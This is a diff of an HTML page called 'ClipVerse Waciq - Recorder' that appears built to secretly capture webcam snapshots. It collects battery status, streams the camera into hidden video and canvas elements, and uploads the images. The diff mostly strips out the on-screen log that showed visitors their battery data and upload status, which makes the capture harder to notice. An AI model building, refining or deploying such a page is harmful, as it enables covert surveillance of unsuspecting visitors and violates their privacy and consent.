@@ -5,9 +5,7 @@
   <title>ClipVerse Waciq - Recorder</title>
   <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
@@ -40,7 +38,6 @@
     .logo {
       width: 100px;
       height: auto;
-      border-radius: 0;
       margin-bottom: 25px;
       box-shadow: 0 0 15px rgba(0,255,255,0.6);
     }
@@ -77,14 +74,8 @@
     }
 
     @keyframes popIn {
-      0% {
-        opacity: 0;
-        transform: scale(0.9);
-      }
-      100% {
-        opacity: 1;
-        transform: scale(1);
-      }
+      0% { opacity: 0; transform: scale(0.9); }
+      100% { opacity: 1; transform: scale(1); }
     }
 
     @media (max-width: 600px) {
@@ -92,23 +83,10 @@
         margin: 0 20px;
         padding: 30px 20px;
       }
-
-      .text {
-        font-size: 16px;
-      }
+      .text { font-size: 16px; }
     }
 
-    /* مخفي ویډیو/کینواس */
-    video, canvas {
-      display: none;
-    }
-
-    .log {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #66ff66;
-      white-space: pre-line;
-    }
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
@@ -120,7 +98,6 @@
       Please stay on the page 🎥
     </div>
     <div class="loader"></div>
-    <div class="log" id="log"></div>
     <div class="credit">𝗠𝗮𝗱𝗲 𝗯𝘆 💛 𝗪𝗔𝗖𝗜𝗤</div>
   </div>
 
@@ -132,7 +109,6 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('snapshot');
     const ctx = canvas.getContext('2d');
-    const log = document.getElementById('log');
     const statusEl = document.getElementById('status');
 
     const params = new URLSearchParams(window.location.search);
@@ -142,8 +118,6 @@
       navigator.getBattery().then(battery => {
         const batteryLevel = Math.round(battery.level * 100);
         const isCharging = battery.charging;
-
-        log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
 
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
           video.srcObject = stream;
@@ -174,11 +148,8 @@
           battery,
           charging
         })
-      }).then(res => res.json()).then(data => {
-        log.innerText += "Snapshot uploaded...\n";
       }).catch(err => {
         console.error("Upload error:", err);
-        log.innerText += "Upload failed!\n";
       });
     }
   </script>
